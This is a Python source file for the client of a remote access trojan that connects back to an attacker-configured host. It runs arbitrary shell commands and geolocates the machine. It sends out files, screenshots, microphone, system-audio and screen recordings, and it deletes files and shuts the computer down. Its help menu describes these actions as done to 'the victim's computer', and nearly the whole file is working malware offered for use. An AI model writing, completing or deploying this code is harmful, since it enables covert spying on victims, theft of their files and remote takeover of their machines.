import socket
import subprocess
import simplejson
import os
import pyttsx3
import ast
from requests import get
import re, uuid
import base64
import pyautogui
import sounddevice
from scipy.io.wavfile import write
import soundcard as sc
import soundfile as sf
import cv2
import numpy as np
import sys


appdata = os.getenv('APPDATA')

class MySocket:
    def __init__(self, ip, port):
        self.my_connection = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        self.my_connection.connect((ip,port))

    def command_execution(self, command):
        return subprocess.check_output(command, shell=True)

    def json_send(self, data):
        json_data = simplejson.dumps(data)
        self.my_connection.send(json_data.encode("utf-8"))

    def json_receive(self):
        datas = ""
        while True:
            try:
                datas = datas + self.my_connection.recv(1024).decode()
                return datas
            except ValueError:
                continue

    def helpMethod(self):
        a = """
    =================================================================================================================
    =    Command                       Description                                                                  =
    =================================================================================================================
    =    clear                         Clear the screen.                                                            =
    =    exit                          Close the connection. (CTRL + C for console)                                 =
    =    whoami                        Find out who the computer is.                                                =
    =    talk <message>                Send a voice message.                                                        =
    =    pwd                           Which folder are you in?                                                     =
    =    cd <folder name>              Make transitioned.                                                           =
    =    ls                            List folder content.                                                         =
    =    open <file/folder name>       Open any folder or file. (Opens on the victim's computer)                    =
    =    read <file name>              Read (.txt) file.                                                            =
    =    shutdown                      Device is shutting down.                                                     =
    =    download <file name>          Download file to the victim's computer.                                      =
    =    upload <file name>            Upload file to the victim's computer.                                        =
    =    screenshot                    Get victim screenshot.                                                       =
    =    remove <file name>            Remove the file from the victim's computer. (NOT FOLDER)                     =
    =    recordvoice <duration>        Record the victim's microphone. (Duration = Seconds)                         =
    =    recordcomputer <duration>     Record the victim's computer sounds. (Duration = Seconds)                    =
    =    recordscreen <duration>       Record the victim's screen. (Duration = Seconds)                             =
    =    test                          Test the connection.                                                         =
    =================================================================================================================
            """
        return a

    def firtMessage(self):
        a = "\tHello hacker, Im online for u!"
        return a

    def whoamiMethod(self):
        hostname = socket.gethostname()
        localip = socket.gethostbyname(hostname)
        publicip = get('https://api.ipify.org').text
        city = get(f'https://ipapi.co/{publicip}/city').text
        region = get(f'https://ipapi.co/{publicip}/region').text
        postal = get(f'https://ipapi.co/{publicip}/postal').text
        timezone = get(f'https://ipapi.co/{publicip}/timezone').text
        currency = get(f'https://ipapi.co/{publicip}/currency').text
        country = get(f'https://ipapi.co/{publicip}/country_name').text
        callcode = get(f"https://ipapi.co/{publicip}/country_calling_code").text
        vpn = get('http://ip-api.com/json?fields=proxy')
        proxy = vpn.json()['proxy']
        mac = ':'.join(re.findall('..', '%012x' % uuid.getnode()))
        netslah = "\n\t"+str(hostname)+" Information\n"+ \
                    "\tUsing VPN: "+str(proxy)+"\n"+\
                    "\tLocal IP: "+str(localip)+"\n"+\
                    "\tPublic IP: "+str(publicip)+"\n"+\
                    "\tMAC Adress: "+str(mac)+"\n"+\
                    "\tCountry: "+str(country)+" | "+str(callcode)+" | "+str(timezone)+"\n"\
                    "\tRegion: "+region+"\n"+\
                    "\tCity: "+str(city)+" | "+str(postal)+"\n"+\
                    "\tCurrency: "+str(currency)+"\n"

        return netslah

    def talkResolverMethod(self,hackersays):
        textToSpeech = pyttsx3.init()
        textToSpeech.say(hackersays)
        textToSpeech.runAndWait()
        return "\t'Worked.'"

    def pwdMethod(self):
        info = os.getcwd()
        return "\t"+info

    def cdMethod(self, folder):
        os.chdir(folder)
        return "\tTransitioned: " + folder

    def lsMethod(self):
        listcontentvalues = os.listdir(os.getcwd())
        content = ' \n\t'.join(listcontentvalues)
        return "\t"+content

    def openMethod(self,filename):
        os.startfile(filename)
        return "\tOpening "+filename+"..."

    def readMethod(self,filename):
        filecontent = ""
        with open(filename, encoding='utf8') as f:
            filecontent = '\t'.join(f.readlines())
        return "\t"+filecontent

    def shutdownMethod(self):
        os.system("shutdown /s /t 1")
        return "\tShutting down."

    def getFileMethod(self,path):
        with open(path,"rb") as my_file:
            return base64.b64encode(my_file.read())

    def saveAnyFile(self,path,content):
        fullpath = appdata+"\\"+path
        with open(fullpath,"wb") as my_file:
            my_file.write(base64.b64decode(content))
            return "\tFile saved... (Uploaded in appdata)"

    def removeFileMethod(self,filename):
        os.remove(filename)
        return "\t"+filename +" "+ "removed."

    def screenShotMethod(self):
        shots = pyautogui.screenshot()
        fullpath = appdata+"\\hellodad.png"
        shots.save(fullpath)
        return fullpath

    def recordVoiceMethod(self,duration):
        rate = 44100
        recording = sounddevice.rec(int(duration*rate), samplerate=rate, channels=2)
        sounddevice.wait()
        fullpath = appdata+"\\outputMicrophone.wav"
        write(fullpath, rate, recording)
        return fullpath

    def recordComputerMethod(self,duration):
        rate = 44100
        fullpath = appdata+"\\outputComputer.wav"

        with sc.get_microphone(id=str(sc.default_speaker().name), include_loopback=True).recorder(samplerate=rate) as mic:
            data = mic.record(numframes=int(duration*rate))
            sf.write(file=fullpath,data=data[:,0], samplerate=rate)
        
        return fullpath

    def recordScreenMethod(self,duration):
        fullpath = appdata+"\\outputScreen.avi"
        SCREEN_SIZE = tuple(pyautogui.size())
        fourcc = cv2.VideoWriter_fourcc(*"XVID")
        fps = 24
        recorder = cv2.VideoWriter(fullpath,fourcc,fps,(SCREEN_SIZE))

        for i in range(duration*fps):
                img = pyautogui.screenshot()
                frame = np.array(img)
                frame = cv2.cvtColor(frame, cv2.COLOR_RGB2BGR)
                recorder.write(frame)
                if cv2.waitKey(1) == ord("q"):
                        break

        cv2.destroyAllWindows()
        recorder.release()

        return fullpath

    def start_socket(self):
        while True:
            command = ast.literal_eval(self.json_receive())
            #os.system("echo "+str(command))
            try:
                if command[0] == "exit":
                    self.my_connection.close()
                    sys.exit()
                elif command[0] == "help":
                    command_output = self.helpMethod()
                elif command[0] == "whoami":
                    command_output = self.whoamiMethod()
                elif command[0] == "talk":
                    if len(command) > 0:
                        command_output = self.talkResolverMethod(command[1:])
                    else:
                        command_output = "talk <message>"
                elif command[0] == "pwd":
                    command_output = self.pwdMethod()
                elif command[0] == "cd":
                    foldernames = ' '.join(command[1:])
                    command_output = self.cdMethod(foldernames)
                elif command[0] == "ls":
                    command_output = self.lsMethod()
                elif command[0] == "open":
                    filename = ' '.join(command[1:])
                    command_output = self.openMethod(filename)
                elif command[0] == "read":
                    filename = ' '.join(command[1:])
                    command_output = self.readMethod(filename)
                elif command[0] == "shutdown":
                    command_output = self.shutdownMethod()
                elif command[0] == "download":
                    filename = ' '.join(command[1:])
                    command_output = self.getFileMethod(filename)
                elif command[0] == "upload":
                    command_output = self.saveAnyFile(command[1],command[2])
                elif command[0] == "screenshot":
                    screenshots = self.screenShotMethod()
                    command_output = self.getFileMethod(screenshots)
                elif command[0] == "remove":
                    filename = ' '.join(command[1:])
                    command_output = self.removeFileMethod(filename)
                elif command[0] == "recordvoice":
                    duration = int(command[1])
                    recItem = self.recordVoiceMethod(duration)
                    command_output = self.getFileMethod(recItem)
                elif command[0] == "recordcomputer":
                    duration = int(command[1])
                    recItem = self.recordComputerMethod(duration)
                    command_output = self.getFileMethod(recItem)
                elif command[0] == "recordscreen":
                    duration = int(command[1])
                    recItem = self.recordScreenMethod(duration)
                    command_output = self.getFileMethod(recItem)
                elif command[0] == "test":
                    command_output = self.firtMessage()
                else:
                    command_output = self.command_execution(str(command[0]))
            except Exception as e:
                command_output = "Exp: No such command found, please use 'help' (CLIENT-MESSAGE).\n"+str(e)
            self.json_send(command_output)
        self.my_connection.close()

try:
    ConfigSocket = MySocket("CHANGE HERE",8080)

    ConfigSocket.start_socket()
except:
    sys.exit()